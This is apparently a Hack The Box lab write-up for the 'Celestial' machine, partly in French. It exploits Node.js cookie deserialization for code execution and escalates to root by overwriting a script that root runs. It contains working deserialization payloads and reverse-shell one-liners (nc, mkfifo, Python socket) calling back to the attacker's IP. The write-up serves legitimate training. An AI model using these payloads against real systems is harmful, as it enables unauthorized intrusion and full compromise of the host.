# HTB - Celestial 10.10.10.85



- Linux 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
- Ubuntu 16.04.1 LTS \n \l

- JS serialisation injection

- Find process with suid and writable command.py



## NMap

```
Port 3000
```

## http://10.10.10.85:3000/  NodeJS
```
Hey Dummy 2 + 2 is 22
```


GET / HTTP/1.1
Host: 10.10.10.85:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"15-iqbh0nIIVq2tZl3LRUnGx4TH3xg"
Cache-Control: max-age=0

eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
Decode Base64
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

{"username":"Admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"3"}
eyJ1c2VybmFtZSI6ImFkbWluIiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjMifQ==
Hey admin 3 + 3 is 33

SyntaxError: Unexpected token {
    at /home/sun/server.js:13:29
    at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/sun/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
    at /home/sun/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)
    at next (/home/sun/node_modules/express/lib/router/index.js:275:10)
    at cookieParser (/home/sun/node_modules/cookie-parser/index.js:70:5)
    at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)

=>> node module cookie-parser:

##JS deserialisation

Explications : https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
& Mega JS payload


On tente un ping
```
{"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('ping 10.10.14.18', function(error, stdout, stderr) { console.log(stdout) }); }()", "username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

Et il arrive !!
```
# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:25:47.573903 IP celestial > kali: ICMP echo request, id 4801, seq 1, length 64
21:25:47.573929 IP kali > celestial: ICMP echo reply, id 4801, seq 1, length 64
21:25:48.569862 IP celestial > kali: ICMP echo request, id 4801, seq 2, length 64
21:25:48.569923 IP kali > celestial: ICMP echo reply, id 4801, seq 2, length 64
21:25:49.570935 IP celestial > kali: ICMP echo request, id 4801, seq 3, length 64
21:25:49.570952 IP kali > celestial: ICMP echo reply, id 4801, seq 3, length 64
```

Payloads qui ne passent pas:
- nc 10.10.14.18 4444 -e /bin/bash

Ca passe : 
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f

{"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) }); }()", "username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

=>
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xOCA0NDQ0ID4vdG1wL2YnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTsgfSgpIiwgInVzZXJuYW1lIjoiRHVtbXkiLCJjb3VudHJ5IjoiSWRrIFByb2JhYmx5IFNvbWV3aGVyZSBEdW1iIiwiY2l0eSI6IkxhbWV0b3duIiwibnVtIjoiMiJ9

```
# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from celestial [10.10.10.85] 60842
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

$ cat Do*/user.txt
XXXXXXXXXXXXXXXXXXXXXXXX
```

## System

```
$ uname -a
Linux sun 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

$ cat /etc/issue
Ubuntu 16.04.1 LTS \n \l
```

## Get root


Document\script.py ecrit dans output.txt

```
sun@sun:~$ ls -al output.txt 
-rw-r--r-- 1 root root 21 Sep 18 16:05 output.txt

sun@sun:~$ cat output.txt 
Script is running...

sun@sun:~$ ls -al Documents
total 16
drwxr-xr-x  2 sun sun 4096 Mar  4  2018 .
drwxr-xr-x 21 sun sun 4096 Sep 18 16:06 ..
-rw-rw-r--  1 sun sun   29 Sep 21  2017 script.py
-rw-rw-r--  1 sun sun   33 Sep 21  2017 user.txt
sun@sun:~$ 
sun@sun:~$ cat Documents/script.py 
print "Script is running..."
```

On y met
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > Documents/script.py    
```
```
# nc -lvp 4446
listening on [any] 4446 ...
connect to [10.10.14.18] from celestial [10.10.10.85] 55432
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
```